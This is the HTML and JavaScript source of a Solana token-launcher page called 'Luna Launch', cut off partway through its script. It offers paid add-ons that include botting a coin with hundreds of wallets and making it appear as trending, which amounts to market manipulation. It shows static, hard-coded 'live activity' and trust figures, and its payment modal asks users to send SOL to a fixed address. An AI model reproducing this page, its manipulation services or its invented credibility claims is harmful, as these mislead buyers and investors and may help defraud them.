<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=1024, user-scalable=no">
    <style>
        html {
            min-width: 1024px;
        }
    </style>
    <meta charset="UTF-8">
    <link rel="icon" type="image/svg+xml" href="asset1/logo.svg">
    <link href="css2.html" rel="stylesheet">
    <title>Luna Launch</title>
    <link rel="stylesheet" href="asset1/index-bdbdubf9.css">
    <script src="../../_nuxt/assets/index.js" type="module"></script>
    <link rel="stylesheet" href="asset1/styles-DQqVfxH3.css">
    <link rel="stylesheet" href="asset1/Nav-CEpo9JHw.css">
    <link rel="stylesheet" href="asset1/Footer-DFm38Gq1.css">
    <link rel="stylesheet" href="asset1/Tools-BXMnATEF.css">
    <link rel="stylesheet" href="asset1/Landing-DtKI65OX.css">
    <link rel="stylesheet" href="asset2/CreateToken-BEr8SLlO.css">
    <style id="mobile-unlock">
        .create-token-btn-mobile { display: none !important; }

        .create-token-box .create-token-btn:not(.create-token-btn-mobile) {
            display: inline-flex !important;
            align-items: center;
            gap: .5rem;
        }
    </style>
    <style id="nav-overlay-hotfix">
        .nav-container { pointer-events: none; }
        .nav-container * { pointer-events: auto; }

        .nav-container::before,
        .nav-container::after { pointer-events: none !important; }

        /* Center the create-token section */
        #create-token {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: calc(100vh - 100px); /* Adjust for header/footer */
            padding: 20px;
            box-sizing: border-box;
            max-width: 800px; /* Limit width for better readability */
            margin: 0 auto; /* Center horizontally */
        }

        #create-token .title-box,
        #create-token .token-creation-box {
            width: 100%;
            text-align: center; /* Center text content */
        }

        #create-token .title-box {
            margin-bottom: 20px;
        }

        #create-token .token-creation-box {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        #create-token .form-section,
        #create-token .submit-section {
            width: 100%;
            max-width: 600px; /* Constrain form width */
        }
    </style>
    <!-- Dependencies for Solana Wallet Adapter and Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@1.95.3/dist/index.global.js"></script>
    <script src="https://unpkg.com/@solana/wallet-adapter-base@0.11.2/dist/index.global.js"></script>
    <script src="https://unpkg.com/@solana/wallet-adapter-wallets@0.20.0/dist/index.global.js"></script>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
</head>
<body>
    <div id="root">
        <div class="nav-container">
            <a class="logo-container active" href="#landing" data-discover="true" aria-current="page">
                <div class="logo-img"><img alt="logo" src="asset1/logo-full.svg"></div>
            </a>
            <nav class="main-nav">
                <a aria-current="page" class="nav-link active" data-discover="true" href="#landing">Home</a>
                <a class="nav-link" data-discover="true" href="#create-token">Create Token</a>
                <a class="nav-link" data-discover="true" href="tools.html">Tools</a>
                <a class="nav-link" href="my-portfolio/index.html" rel="noopener noreferrer">Liquidity Pool</a>
                <a class="nav-link" href="https://raydium.io/swap" rel="noopener noreferrer" target="_blank">Manage Liquidity</a>
            </nav>
            <div class="wallet-dropdown">
                <div class="wallet-display connect-wallet-btn" id="connect-wallet">Connect Wallet</div>
                <button class="menu-icon" style="background-color: rgb(255, 255, 255); border-radius: 5px; border: medium; cursor: pointer; padding: 8px; margin-left: 10px; transition: 0.3s; display: flex; align-items: center; justify-content: center;">
                    <span class="material-symbols-rounded">
                        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" class="feather feather-menu" viewBox="0 0 24 24" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <line x1="3" y1="12" x2="21" y2="12"></line>
                            <line x1="3" y1="6" x2="21" y2="6"></line>
                            <line x1="3" y1="18" x2="21" y2="18"></line>
                        </svg>
                    </span>
                </button>
                <div class="sidebar-menu closed">
                    <div class="sidebar-menu-item"><a class="nav-link active" href="#landing" data-discover="true" aria-current="page">Home</a></div>
                    <div class="sidebar-menu-item"><a class="nav-link" href="#create-token" data-discover="true">Create Token</a></div>
                    <div class="sidebar-menu-item"><a class="nav-link" href="tools.html" data-discover="true">Tools</a></div>
                    <div class="sidebar-menu-item"><a href="https://raydium.io/liquidity/create-pool" class="nav-link" target="_blank" rel="noopener noreferrer">Liquidity Pool</a></div>
                    <div class="sidebar-menu-item"><a href="https://raydium.io/swap" class="nav-link" target="_blank" rel="noopener noreferrer">Manage Liquidity</a></div>
                    <div class="sidebar-menu-item"><a class="nav-link" href="https://lunalaunch.com/support" data-discover="true">Support</a></div>
                </div>
            </div>
        </div>
        <div id="main">
            <div id="landing" style="opacity: 1; display: block;">
                <div class="hero-section">
                    <div class="trust-indicators" style="transform: translateY(0.64479%);">
                        <div class="trust-stats">
                            <div class="trust-stat"><div class="trust-number">50,000+</div><div class="trust-label">Tokens Created</div></div>
                            <div class="trust-stat"><div class="trust-number">25,000+</div><div class="trust-label">Active Users</div></div>
                            <div class="trust-stat"><div class="trust-number">99.9%</div><div class="trust-label">Success Rate</div></div>
                        </div>
                        <div class="trust-badges">
                            <div class="trust-badge"><div class="badge-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1 .9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 16H6V10h12v12z" fill="#00FFA3"></path><circle cx="12" cy="15" r="2" fill="#00FFA3"></circle></svg></div><span>Secure &amp; Audited</span></div>
                            <div class="trust-badge"><div class="badge-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 2v11h3v9l7-12h-4l4-8z" fill="#FFD700"></path></svg></div><span>Lightning Fast</span></div>
                            <div class="trust-badge"><div class="badge-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.4 16,13V16C16,17.4 15.4,18 14.8,18H9.2C8.6,18 8,17.4 8,16V13C8,12.4 8.6,11.5 9.2,11.5V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,10V11.5H13.5V10C13.5,8.7 12.8,8.2 12,8.2Z" fill="#00FFA3"></path></svg></div><span>100% Safe</span></div>
                        </div>
                        <div class="live-activity">
                            <div class="activity-header"><div class="live-dot"></div><span>Live Activity</span></div>
                            <div class="activity-item"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;"><path d="M2.81 14.7l1.68-1.81c.69-.74 1.08-1.71 1.08-2.72V9c0-.89.33-1.78 1-2.45C7.22 5.89 8.11 5.56 9 5.56c.89 0 1.78.33 2.45 1S12.44 8.11 12.44 9v1.17c0 1.01.39 1.98 1.08 2.72l1.68 1.81c.31.33.31.85 0 1.18-.31.33-.85.33-1.18 0L12 13.83c-.68-.73-1.71-1.15-2.81-1.15s-2.13.42-2.81 1.15L4.36 15.9c-.33.33-.87.33-1.18 0-.32-.33-.32-.85-.01-1.18z" fill="#FF6B35"></path><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" fill="#FF6B35"></path></svg><span>TokenX launched 2 min ago</span></div>
                            <div class="activity-item"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;"><path d="M6,2L18,22L12,18L6,22L6,2Z" fill="#00D4FF"></path></svg><span>CryptoGem deployed 5 min ago</span></div>
                            <div class="activity-item"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right: 8px; vertical-align: middle;"><path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-.46-.04-.92-.1-1.36-.98 1.37-2.58 2.26-4.4 2.26-2.98 0-5.4-2.42-5.4-5.4 0-1.81.89-3.42 2.26-4.4-.44-.06-.90-.1-1.36-.1z" fill="#FFD700"></path></svg><span>MoonShot created 8 min ago</span></div>
                        </div>
                    </div>
                    <div class="title-box">
                        <span class="title-1">#1 Solana Token Launcher in the World</span>
                        <div class="title-2">
                            <span class="span-1">Launch your <span style="font-weight: 900;">$Solana</span> Token</span>
                            <span class="span-2"><span style="font-weight: 700;">Take it</span> <span style="font-weight: 500;">to the</span> <span style="font-weight: 900;">Moon!</span></span>
                        </div>
                        <div class="desc">
                            <span class="span-1">Create and deploy your Solana coin effortlessly in seconds.</span>
                            <span class="span-2">Reach the world and scale without limits!</span>
                        </div>
                        <div class="create-token-box">
                            <input class="create-token-text" placeholder="Create your first token" value="">
                            <div class="create-token-btn create-token-btn-mobile" style="cursor: pointer; display: none;"><span class="text">Token creation is only available on desktop</span></div>
                            <div onclick="location.href='#create-token'" class="create-token-btn" style="cursor: pointer;"><span class="text">Create Token</span><span class="material-symbols-rounded"></span></div>
                        </div>
                    </div>
                    <div class="background-1" style="transform: translateY(0.48359%);"><img alt="Earth Background" src="asset1/bg1-DWJ0RCfe.png"></div>
                    <div class="background-2"><img alt="iPhone Screenshot" src="asset1/iPhoneSS-DpoVylXb.png"></div>
                </div>
                <div class="content-container">
                    <div class="content-section">
                        <div class="content-text-1"><span class="span-1">The world’s most powerful</span><span class="span-2">Solana Launcher ever.</span></div>
                        <div class="content-img-1">
                            <div class="content-controls"><span></span><span></span><span></span></div>
                            <div class="border-bg"></div>
                            <img src="asset1/contentimg1-d6m7sRFw.png">
                            <div class="fade-fg"></div>
                        </div>
                    </div>
                    <div class="phone-parallax-section">
                        <div class="parallax-title">Unlock the Full Potential of Your Solana Token Effortlessly</div>
                        <div class="img-container">
                            <img class="left-img" style="transform: translateY(30%);" src="asset1/coinGroup1-R48YoBp5.png">
                            <img class="iphone-img" src="asset1/iPhone%20Image-pZbQWzRq.png">
                            <img class="right-img" style="transform: translateY(30%);" src="asset1/coinGroup2-Bkx6Q6TB.png">
                        </div>
                    </div>
                    <div class="features-section">
                        <div class="features-label">Features</div>
                        <div class="features-title">Unlock the Full Potential of Your Solana Token Effortlessly</div>
                        <div class="features-subtitle">Create, manage, and launch your Solana token effortlessly with secure transactions, instant deployment, and zero coding required!</div>
                        <div class="features-container">
                            <div class="features-img"><img src="asset1/iPhone%20Image-pZbQWzRq.png"></div>
                            <div class="features-stats">
                                <div class="features-stat"><div class="features-stat-value">99.9%</div><div class="features-stat-label">Successful Token Launches</div></div>
                                <div class="features-stat"><div class="features-stat-value">85%+</div><div class="features-stat-label">Returned Users</div></div>
                            </div>
                            <div class="features-description">
                                <div class="features-description-text">
                                    <div class="features-description-title">Create &amp; Deploy Your Token in Minutes</div>
                                    <div class="features-description-subtitle">Turn your idea into reality with lightning-fast token creation. Whether for projects, communities, or innovation, deploy your Solana token in minutes - with ease, secure, and built for the future!</div>
                                </div>
                                <div onclick="location.href='#create-token'" class="create-token-btn" style="cursor: pointer;"><span class="text" href="#create-token">Create Token</span><span class="material-symbols-rounded"></span></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="create-token" style="opacity: 1; display: none;">
                <div class="title-box">
                    <div class="title-text">Solana Token Creator</div>
                    <div class="title-desc"><span class="span-1">Create and deploy your Solana coin effortlessly in seconds.</span><span class="span-2">Reach the world and scale without limits!</span></div>
                </div>
                <form class="token-creation-box">
                    <div class="form-section">
                        <div class="form-field"><label class="field-label">Token Name *</label><input placeholder="Ex: Trump Coin" class="field-input" type="text" name="name" value=""><span class="field-constraint">Max 32 characters in your name</span></div>
                        <div class="form-field"><label class="field-label">Token Symbol *</label><input placeholder="Ex: SOL" class="field-input" type="text" name="symbol" value=""><span class="field-constraint"></span></div>
                        <div class="form-field"><label class="field-label">Decimals *</label><input placeholder="Ex: 9" class="field-input" type="number" name="decimals" value="9"><span class="field-constraint">Change the number of decimals for your token</span></div>
                        <div class="form-field"><label class="field-label">Supply *</label><input placeholder="Ex: 1000000000" class="field-input" type="number" name="supply" value="1000000"><span class="field-constraint">The initial number of available tokens that will be, created in your wallet</span></div>
                        <div class="logo-wrapper">
                            <div class="logo-box"><span class="label-text">Logo *</span><div class="img-input-wrapper"><span class="material-symbols-rounded">upload</span><span class="text-1">Drag and drop here to upload</span><div class="text-2">.png, .jpg 1000x1000 px</div><input accept=".png, .jpg, .jpeg" class="form-img" type="file"></div><span class="field-constraint">Add logo for your token!</span></div>
                            <div class="logo-generation-box">
                                <div style="display: flex; gap: 0.6rem;"><div class="label-text">Generate Personalized AI Logo</div><span style="padding: 0.2rem 0.7rem; background: rgb(17, 17, 17); border-radius: 3ex; font-size: 0.7rem; color: rgb(107, 95, 246);">COMING SOON</span></div>
                                <div class="generation-wrapper"><div class="generation-box"><img src="asset1/bba1c45c4d7a1e2206dbce3838618fb84d176061.svg"></div></div>
                                <div class="generation-set"><span class="field-constraint">Lazy to Create a Logo? Use our Personalized AI Logo Generator for your Token Name</span><div class="generate-btn">Generate</div><span class="field-constraint">(At just 0.05 SOL)</span></div>
                            </div>
                        </div>
                        <div class="form-field"><label class="field-label">Description *</label><textarea type="long" placeholder="Here you can describe your token" class="field-input" name="description"></textarea><span class="field-constraint"></span></div>
                    </div>
                    <div class="form-divider"></div>
                    <div class="form-section">
                        <div class="toggle-section">
                            <div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="custom_banner.is_enabled" style="display: none;" type="checkbox" name="custom_banner.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Custom Token Banner</div></div><div class="toggle-cost ">+0.1 SOL</div></div>
                            <div class="toggle-section-description">Add a custom banner image to your token's metadata (e.g., for display on DEX Screener).</div>
                        </div>
                        <div class="toggle-section">
                            <div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="multi_chain_launch.is_enabled" style="display: none;" type="checkbox" name="multi_chain_launch.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Multi Chain Launch</div></div><div class="toggle-cost toggle-cost-free">FREE</div></div>
                            <div class="toggle-section-description">Deploy your token across multiple blockchains for broader reach and liquidity.</div>
                        </div>
                        <div class="toggle-section">
                            <div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="advanced_privacy.is_enabled" style="display: none;" type="checkbox" name="advanced_privacy.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Advanced Privacy</div></div><div class="toggle-cost ">0.5 SOL</div></div>
                            <div class="toggle-section-description">Enhanced privacy features and anonymization tools for secure token operations.</div>
                        </div>
                        <div class="toggle-section">
                            <div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="project_trend.is_enabled" style="display: none;" type="checkbox" name="project_trend.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Project Trend</div></div><div class="toggle-cost ">0.3 SOL</div></div>
                            <div class="toggle-section-description">Boost your coin's visibility by appearing as trending across major platforms.</div>
                        </div>
                        <div class="toggle-section">
                            <div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="bot_service.is_enabled" style="display: none;" type="checkbox" name="bot_service.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Bot Your Coin</div></div><div class="toggle-cost ">1 SOL</div></div>
                            <div class="toggle-section-description">We will bot your coin with 200-500 random wallets investing random amounts to boost your coin to the top on DEX and Axiom.</div>
                        </div>
                        <div class="toggle-section">
                            <div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="creator.is_enabled" style="display: none;" type="checkbox" name="creator.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Creator's Info (Optional)</div></div><div class="toggle-cost ">+0.1 SOL</div></div>
                            <div class="toggle-section-description">Change the information of the creator in the metadata. By default, it is Luna Launch.</div>
                        </div>
                        <div class="toggle-section">
                            <div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="social_links.is_enabled" style="display: none;" type="checkbox" name="social_links.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label">Add Social Links &amp; Tags</div></div><div class="toggle-cost ">+0.1 SOL</div></div>
                            <div class="toggle-section-description">Add links to your token metadata.</div>
                        </div>
                        <div class="toggle-section">
                            <div class="toggle-section-header"><div class="toggle-header-left"><div class="toggle" data-toggled="false" style="opacity: 1;"><input id="luna_liquidity.is_enabled" style="display: none;" type="checkbox" name="luna_liquidity.is_enabled"><div class="toggle-marker"></div></div><div class="toggle-label"><div style="display: flex; align-items: center; gap: 8px;">Luna Liquidity Pool<div style="display: inline-flex; align-items: center; justify-content: center; width: 18px; height: 18px; border-radius: 50%; background: linear-gradient(135deg, rgb(107, 95, 246) 0%, rgb(140, 123, 255) 100%); color: white; font-size: 11px; font-weight: 600; cursor: help; position: relative; box-shadow: rgba(107, 95, 246, 0.2) 0px 2px 4px; transition: 0.2s;">i</div></div></div></div><div class="toggle-cost toggle-cost-free">FREE</div></div>
                            <div class="toggle-section-description">Full access to the liquidity pool.</div>
                        </div>
                    </div>
                    <div class="form-divider"></div>
                    <div class="form-section">
                        <div class="form-section-title">Revoke Authorities (Investor’s Booster)</div>
                        <div class="form-section-authorities">
                            <div class="form-radio-field"><div class="form-radio-header"><div class="form-radio-label">Revoke Freeze</div><div class="checkbox " data-checked="true" style="cursor: pointer; user-select: none;"><input id="authorities.revoke_freeze" style="display: none;" type="checkbox" checked=""><div class="checkbox-marker"></div></div></div><div class="form-radio-description">No one will be able to freeze holders' token accounts anymore</div><div class="form-radio-cost">+0.1 SOL</div></div>
                            <div class="form-radio-field"><div class="form-radio-header"><div class="form-radio-label">Revoke Mint</div><div class="checkbox " data-checked="true" style="cursor: pointer; user-select: none;"><input id="authorities.revoke_mint" style="display: none;" type="checkbox" checked=""><div class="checkbox-marker"></div></div></div><div class="form-radio-description">No one will be able to create more tokens anymore</div><div class="form-radio-cost">+0.1 SOL</div></div>
                            <div class="form-radio-field"><div class="form-radio-header"><div class="form-radio-label">Revoke Update</div><div class="checkbox " data-checked="true" style="cursor: pointer; user-select: none;"><input id="authorities.revoke_update" style="display: none;" type="checkbox" checked=""><div class="checkbox-marker"></div></div></div><div class="form-radio-description">No one will be able to modify token metadata anymore</div><div class="form-radio-cost">+0.1 SOL</div></div>
                        </div>
                        <div class="form-section-description">Solana Token has 3 authorities: Freeze Authority, Mint Authority, and Update Authority. Revoke them to attract more investors.</div>
                    </div>
                    <div class="submit-section">
                        <div class="form-field"><label class="field-label">Enter token recipient (Optional) *</label><input placeholder="Leave empty to default to the wallet that sends payment" class="field-input" type="text" name="recipient_address" value=""><span class="field-constraint"></span></div>
                        <div class="button-and-fees"><button type="button" class="submit-btn" id="launch-token">Launch Token</button><div class="token-fees-container"><span>Total Fees: <strike>0.6 SOL</strike> 0.3 SOL</span></div></div>
                    </div>
                </form>
            </div>
        </div>
        <div class="footer-container">
            <a class="logo-container active" href="#landing" data-discover="true" aria-current="page"><div class="logo-img"><img alt="logo" src="asset1/logo-full.svg"></div></a>
            <div class="bottom-bar" select="false">
                <div class="copyright-bar"><span>© Luna Launcher 2025</span></div>
                <div class="policies-bar"><a class="policy-link" href="terms-of-service.html" data-discover="true">Terms of Service</a><span class="separator"></span><a class="policy-link" href="privacy-policy.html" data-discover="true">Privacy Policy</a></div>
            </div>
            <div class="wallet-dropdown"><div class="wallet-display connect-wallet-btn" id="connect-wallet-footer">Connect Wallet</div></div>
        </div>
    </div>
<script>
// API base URL
const API_BASE = window.location.origin;

// Calculate fees function
async function calculateFees(options) {
  try {
    const response = await fetch(`${API_BASE}/api/token/calculate-fees`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ options })
    });
    
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error calculating fees:', error);
    return null;
  }
}

// Create token function
async function createToken(tokenData) {
  try {
    const response = await fetch(`${API_BASE}/api/token/create`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(tokenData)
    });
    
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error creating token:', error);
    return { success: false, error: error.message };
  }
}

// Update your existing fee calculation to use the API
function updateFeesFromAPI() {
  const options = {
    customBanner: document.querySelector('input[name="custom_banner.is_enabled"]')?.checked || false,
    advancedPrivacy: document.querySelector('input[name="advanced_privacy.is_enabled"]')?.checked || false,
    projectTrend: document.querySelector('input[name="project_trend.is_enabled"]')?.checked || false,
    botService: document.querySelector('input[name="bot_service.is_enabled"]')?.checked || false,
    creatorInfo: document.querySelector('input[name="creator.is_enabled"]')?.checked || false,
    socialLinks: document.querySelector('input[name="social_links.is_enabled"]')?.checked || false,
    revokeFreeze: document.querySelector('input[name="authorities.revoke_freeze"]')?.checked || false,
    revokeMint: document.querySelector('input[name="authorities.revoke_mint"]')?.checked || false,
    revokeUpdate: document.querySelector('input[name="authorities.revoke_update"]')?.checked || false
  };

  calculateFees(options).then(result => {
    if (result && result.success) {
      const container = document.querySelector('.token-fees-container');
      if (container) {
        const span = container.querySelector('span') || container;
        span.innerHTML = `Total Fees: <span class="line-through">${result.data.original} SOL</span> ${result.data.final} SOL`;
      }
      
      const feeAmt = document.getElementById('ll-fee-amount');
      if (feeAmt) {
        feeAmt.textContent = `${result.data.final} SOL`;
      }
    }
  });
}

// Update your existing toggle handlers to call the API
function bindToggleHandlers() {
  document.querySelectorAll('.toggle-section, .form-radio-field').forEach(element => {
    element.addEventListener('click', () => {
      setTimeout(updateFeesFromAPI, 100);
    });
  });
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', () => {
  bindToggleHandlers();
  updateFeesFromAPI();
});
</script>
    <script>
        (() => {
            "use strict";

            // ====== CONFIG ======
            const PLATFORM_FEE = 0.3;            // Base platform fee in SOL
            const DISCOUNT_FACTOR = 0.5;         // 50% discount on total fees
            const FEE_ADDRESS = "JchoZmAvqcWzJoei8WFfmVGL1c9x2755TJHq2HikkfV"; // Receiver address for transfers

            // ====== HELPERS ======
            const $ = (sel, root = document) => root.querySelector(sel);
            const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
            const num = (x) => (isFinite(x) ? Number(x) : 0);
            const getFirstNumber = (txt) => {
                if (!txt) return 0;
                const m = String(txt).replace(",", ".").match(/([\d.]+)/);
                return m ? parseFloat(m[1]) : 0;
            };
            const formatSOL = (n, d = 1) => `${n.toFixed(d)} SOL`;

            // Create modal styles and elements if not present
            function ensureGlobalUI() {
                if (!$("#ll-modal-styles")) {
                    const style = document.createElement("style");
                    style.id = "ll-modal-styles";
                    style.textContent = `
                        .ll-modal{position:fixed;z-index:1000;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.76)}
                        .ll-modal.open{display:flex}
                        .ll-modal-card{position:relative;width:min(750px,92vw);background:#181818;border-radius:12px;padding:20px;color:#fff;text-align:center;border:1px solid #242424}
                        .ll-modal-close{position:absolute;right:10px;top:8px;font-size:24px;cursor:pointer}
                        .ll-row{display:flex;align-items:center;gap:10px}
                        .ll-addr{display:flex;align-items:center;background:#f7f7f738;color:#eaeaea;padding:10px;border-radius:25px;margin-top:10px}
                        .ll-btn{background:#fff;color:#000;border-radius:4ex;border:none;padding:.7rem 3.5rem;font-size:1.05rem;cursor:pointer;box-shadow:0 8px 17px #ffffff1a,0 31px 31px #ffffff17,0 69px 41px #ffffff0d,0 122px 49px #ffffff03}
                        .ll-loader-wrap{position:absolute;inset:0;background:rgba(0,0,0,.65);display:none;align-items:center;justify-content:center;border-radius:12px}
                        .ll-loader{border:8px solid #f3f3f3;border-top:8px solid #fff;border-radius:50%;width:50px;height:50px;animation:llspin 1s linear infinite}
                        @keyframes llspin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
                        .line-through{text-decoration:line-through}
                        .closed{display:none !important}
                    `;
                    document.head.appendChild(style);
                }

                if (!$("#ll-fee-modal")) {
                    const wrap = document.createElement("div");
                    wrap.className = "ll-modal";
                    wrap.id = "ll-fee-modal";
                    wrap.innerHTML = `
                        <div class="ll-modal-card">
                            <div class="ll-loader-wrap" id="ll-loader-1"><div class="ll-loader"></div></div>
                            <span class="ll-modal-close" data-close="ll-fee-modal">&times;</span>
                            <h2 class="ll-row" style="justify-content:center;margin:0 0 10px;">
                                <img src="asset1/sol.png" width="30" style="margin-right:6px" alt="SOL"> Payment
                            </h2>
                            <p>Send <b id="ll-fee-amount"></b> to the following address. After a successful transaction click “Check transaction”.</p>
                            <div class="ll-addr">
                                <span id="ll-fee-address" style="word-break:break-all">${FEE_ADDRESS}</span>
                                <button id="ll-copy-addr" class="ll-btn" style="padding:.4rem 1rem;margin-left:auto;">Copy</button>
                            </div>
                            <div style="margin-top:18px;">
                                <button id="ll-check-tx" class="ll-btn">Check transaction</button>
                            </div>
                        </div>`;
                    document.body.appendChild(wrap);
                }

                if (!$("#ll-ok-modal")) {
                    const wrap2 = document.createElement("div");
                    wrap2.className = "ll-modal";
                    wrap2.id = "ll-ok-modal";
                    wrap2.innerHTML = `
                        <div class="ll-modal-card">
                            <div class="ll-loader-wrap" id="ll-loader-2"><div class="ll-loader"></div></div>
                            <span class="ll-modal-close" data-close="ll-ok-modal">&times;</span>
                            <h2 class="ll-row" style="justify-content:center;margin:0 0 10px;">
                                <img src="asset1/congratulations.png" width="30" style="margin-right:6px" alt="✓"> Congratulations
                            </h2>
                            <p>Your token has been successfully created.</p>
                            <div class="ll-addr">
                                <span id="ll-mint-address" style="word-break:break-all">YourTokenAddressHere</span>
                                <button id="ll-copy-mint" class="ll-btn" style="padding:.4rem 1rem;margin-left:auto;">Copy</button>
                            </div>
                            <div style="margin-top:18px;">
                                <button id="ll-ok" class="ll-btn">Okay</button>
                            </div>
                        </div>`;
                    document.body.appendChild(wrap2);
                }
            }

            // Modal open/close functions
            const openModal = (id) => { const el = document.getElementById(id); if (el) el.classList.add("open"); };
            const closeModal = (id) => { const el = document.getElementById(id); if (el) el.classList.remove("open"); };
            window.openModal = () => openModal('ll-fee-modal');

            // Copy text to clipboard
            async function copyText(txt) {
                try { await navigator.clipboard.writeText(txt); } catch(e) { console.error("Copy failed:", e); }
            }

            // ====== FEES ======
            function parseToggleCost(section) {
                const costEl = $(".toggle-cost", section);
                if (!costEl) return 0;
                if (costEl.classList.contains("toggle-cost-free")) return 0;
                return getFirstNumber(costEl.textContent);
            }
            function isToggleChecked(section) {
                const input = $("input[type='checkbox']", section);
                return !!(input && input.checked);
            }
            function setToggle(section, checked) {
                const input = $("input[type='checkbox']", section);
                const toggle = $(".toggle", section);
                if (input) input.checked = !!checked;
                if (toggle) toggle.dataset.toggled = checked ? "true" : "false";
                const body = $(".toggle-section-body", section);
                if (body) body.style.display = checked ? "block" : "none";
            }

            function calcAuthoritiesFees() {
                let sum = 0;
                $$(".form-section-authorities .form-radio-field").forEach(field => {
                    const checkboxWrap = $(".checkbox", field);
                    const cost = getFirstNumber($(".form-radio-cost", field)?.textContent || "");
                    const checked =
                        (checkboxWrap?.getAttribute("data-checked") ?? "false") === "true" ||
                        $("input[type='checkbox']", checkboxWrap)?.checked;
                    if (checked) sum += num(cost);
                });
                return sum;
            }

            function calcOptionsFees() {
                let sum = 0;
                $$(".form-section .toggle-section").forEach(section => {
                    const checked = isToggleChecked(section);
                    if (!checked) return;
                    sum += num(parseToggleCost(section));
                });
                return sum;
            }

            function updateFeesUI() {
                const container = $(".token-fees-container");
                if (!container) return;

                const original = PLATFORM_FEE + calcAuthoritiesFees() + calcOptionsFees();
                const discounted = original * DISCOUNT_FACTOR;

                const span = $("span", container) || container;
                span.innerHTML = `Total Fees: <span class="line-through">${formatSOL(original)}</span> ${formatSOL(discounted)}`;

                const feeAmt = $("#ll-fee-amount");
                if (feeAmt) feeAmt.textContent = formatSOL(discounted);
                return { original, discounted };
            }

            // ====== DYNAMIC BODIES FOR TOGGLES ======
            function ensureToggleBodies() {
                const creatorSection = $("#creator\\.is_enabled")?.closest(".toggle-section");
                if (creatorSection && !$(".toggle-section-body", creatorSection)) {
                    const body = document.createElement("div");
                    body.className = "toggle-section-body";
                    body.style.display = "none";
                    body.innerHTML = `
                        <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:1rem;">
                            <div class="form-field">
                                <label class="field-label">Creator's Address *</label>
                                <input placeholder="Ex: 3stNIYCJd..." class="field-input" type="text" name="creator.address">
                                <span class="field-constraint"></span>
                            </div>
                            <div class="form-field">
                                <label class="field-label">Creator's Name *</label>
                                <input placeholder="Ex: John Doe" class="field-input" type="text" name="creator.name">
                                <span class="field-constraint"></span>
                            </div>
                        </div>`;
                    creatorSection.appendChild(body);
                }

                const socialSection = $("#social_links\\.is_enabled")?.closest(".toggle-section");
                if (socialSection && !$(".toggle-section-body", socialSection)) {
                    const body = document.createElement("div");
                    body.className = "toggle-section-body";
                    body.style.display = "none";
                    body.innerHTML = `
                        <div style="display:flex;flex-direction:column;gap:.6rem;">
                            <div class="form-field">
                                <label class="field-label">Telegram Link *</label>
                                <input placeholder="Ex: https://t.me/" class="field-input" type="text" name="social_links.telegram">
                            </div>
                            <div class="form-field">
                                <label class="field-label">Twitter/X Link *</label>
                                <input placeholder="Ex: https://x.com/@your" class="field-input" type="text" name="social_links.twitter">
                            </div>
                            <div class="form-field">
                                <label class="field-label">Website Link *</label>
                                <input placeholder="Ex: https://example.com" class="field-input" type="text" name="social_links.project_website">
                            </div>
                        </div>`;
                    socialSection.appendChild(body);
                }

